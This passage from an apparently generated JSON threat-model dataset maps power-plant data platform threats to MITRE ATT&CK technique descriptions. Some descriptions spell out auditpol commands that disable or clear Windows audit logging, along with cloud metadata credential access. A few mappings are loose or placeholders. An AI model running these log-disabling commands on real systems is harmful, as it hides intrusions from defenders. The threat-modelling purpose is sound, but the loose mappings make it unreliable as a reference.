disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker alters log files to erase traces of unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to gain elevated privileges.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation pathways."
                },
                {
                    "Assumption": "Logs are not safeguarded against tampering.",
                    "Role": "System Administrator",
                    "Condition": "Log protection measures."
                }
            ],
            "Potential Impact": "Failed forensic investigations and undetected malicious activity.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "forensic evasion",
                "unauthorized activity"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Local data logger denies forwarding data leading to data loss claims.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient verification mechanism from data logger to receiver.",
                    "Role": "System Designer",
                    "Condition": "Verification protocols."
                },
                {
                    "Assumption": "Logs do not reflect accurate transfer statuses.",
                    "Role": "System Designer",
                    "Condition": "Logging accuracy."
                }
            ],
            "Potential Impact": "Data loss accusations and operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "data logger",
                "repudiation",
                "data transfer verification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive sensor data is intercepted during transmission.",
            "Assumptions": [
                {
                    "Assumption": "No encryption or weak encryption methods used during data transmission.",
                    "Role": "System Designer",
                    "Condition": "Encryption practices."
                },
                {
                    "Assumption": "Network vulnerabilities exist that allow traffic interception.",
                    "Role": "Attacker",
                    "Condition": "Network security weaknesses."
                }
            ],
            "Potential Impact": "Unauthorised access to sensitive operational data leading to potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "network interception",
                "data transmission",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses metadata containing sensitive information about power plants.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is not adequately secured and access controlled.",
                    "Role": "System Administrator",
                    "Condition": "Access control practices."
                },
                {
                    "Assumption": "The system does not adequately obscure or anonymize sensitive metadata.",
                    "Role": "System Designer",
                    "Condition": "Anonymization practices."
                }
            ],
            "Potential Impact": "Leakage of sensitive operational details and exploitation vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "metadata",
                "information disclosure",
                "access control"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud-stored pre-processed data is accessed by unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Weak cloud security settings and access management.",
                    "Role": "Cloud Administrator",
                    "Condition": "Cloud security configurations."
                },
                {
                    "Assumption": "Insufficient audit of access logs and activities.",
                    "Role": "System Administrator",
                    "Condition": "Access log monitoring."
                }
            ],
            "Potential Impact": "Compromise of anonymized but still sensitive data, leading to potential reverse engineering.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "data access",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A flood of illegitimate sensor data overwhelms the data logger.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting or data validation checks in place.",
                    "Role": "System Architect",
                    "Condition": "Data validation mechanisms."
                },
                {
                    "Assumption": "The attacker can generate high volumes of traffic at will.",
                    "Role": "Attacker",
                    "Condition": "Resource availability."
                }
            ],
            "Potential Impact": "Disruption in data collection, leading to operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data logger",
                "traffic flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on the LIGHT-TOREADOR platform disrupts model training and predictions.",
            "Assumptions": [
                {
                    "Assumption": "The platform does not have adequate DDoS protection.",
                    "Role": "Infrastructure Manager",
                    "Condition": "DDoS protection measures."
                },
                {
                    "Assumption": "Network bandwidth and resources are susceptible to saturation.",
                    "Role": "Attacker",
                    "Condition": "Bandwidth limits."
                }
            ],
            "Potential Impact": "Inability to perform predictive maintenance and optimize power flow due to disrupted service.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "platform",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious payloads sent to the dashboard overwhelms the interface.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard input validation is inadequate.",
                    "Role": "System Designer",
                    "Condition": "Validation mechanisms."
                },
                {
                    "Assumption": "The attacker can access the dashboard interface.",
                    "Role": "Attacker",
                    "Condition": "Interface access."
                }
            ],
            "Potential Impact": "Operational disruption as employees are unable to interact with the dashboard effectively.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "dashboard",
                "interface overload"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain admin access to the data logger.",
            "Assumptions": [
                {
                    "Assumption": "There are exploitable vulnerabilities within the data logger.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability presence."
                },
                {
                    "Assumption": "Insufficient patch management practice.",
                    "Role": "System Administrator",
                    "Condition": "Patch management efficiency."
                }
            ],
            "Potential Impact": "Complete control over data logging and potential manipulation of sensor data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "admin access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of cloud service misconfiguration to attain privileged access.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigurations exist in the cloud service settings.",
                    "Role": "Cloud Administrator",
                    "Condition": "Configuration practices."
                },
                {
                    "Assumption": "The attacker has identified and can exploit these misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Access to cloud environment."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and administrative functions within the cloud environment.",
            "MITRE ATT&CK Keywords": [
                "cloud misconfiguration",
                "privilege escalation",
                "cloud service"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider exploits existing roles and permissions to gain unauthorized privileges.",
            "Assumptions": [
                {
                    "Assumption": "Existing roles and permissions are not adequately reviewed and managed.",
                    "Role": "System Administrator",
                    "Condition": "Role management practices."
                },
                {
                    "Assumption": "The insider has sufficient access to manipulate roles.",
                    "Role": "Insider",
                    "Condition": "Access levels."
                }
            ],
            "Potential Impact": "Unauthorized actions including data manipulation and unauthorized system configurations.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege escalation",
                "role manipulation"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access by spoofing the identity of a legitimate data logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Network access is available."
                },
                {
                    "Assumption": "The data logger does not use strong authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Weak or no authentication is implemented."
                },
                {
                    "Assumption": "The attacker can intercept and replay authentication tokens.",
                    "Role": "Attacker",
                    "Condition": "Tokens are reused or not securely transmitted."
                }
            ],
            "Potential Impact": "Unauthorized access to sensor data and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Anonymity (Anon) Agent is tricked into accepting data updates from a spoofed sensor device.",
            "Assumptions": [
                {
                    "Assumption": "Sensor authentication can be circumvented.",
                    "Role": "Attacker",
                    "Condition": "Authentication is weak or nonexistent."
                },
                {
                    "Assumption": "The attacker has physical or remote network access.",
                    "Role": "Attacker",
                    "Condition": "Network or physical proximity."
                },
                {
                    "Assumption": "The Anon Agent does not validate source authenticity rigorously.",
                    "Role": "System Designer",
                    "Condition": "Source validation is weak."
                }
            ],
            "Potential Impact": "Corruption of pre-processed data affecting AI/ML models.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access by using a compromised employee's credentials for the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Employee credentials can be phished.",
                    "Role": "Attacker",
                    "Condition": "Phishing attack is successful."
                },
                {
                    "Assumption": "Dashboard does not implement multi-factor authentication (MFA).",
                    "Role": "System Designer",
                    "Condition": "MFA is not required."
                },
                {
                    "Assumption": "Password hygiene is poor or reused across services.",
                    "Role": "Employee",
                    "Condition": "Weak passwords or reuse."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational status and metadata, potential tampering with predictions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "credential",
                "device"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor data in transit to the data logger.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Encryption is not applied."
                },
                {
                    "Assumption": "The attacker has network access to intercept data.",
                    "Role": "Attacker",
                    "Condition": "Network access is available."
                },
                {
                    "Assumption": "There are no integrity checks on received data.",
                    "Role": "System Designer",
                    "Condition": "Integrity checks are not implemented."
                }
            ],
            "Potential Impact": "Integrity of sensor data is compromised, leading to inaccurate predictions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from 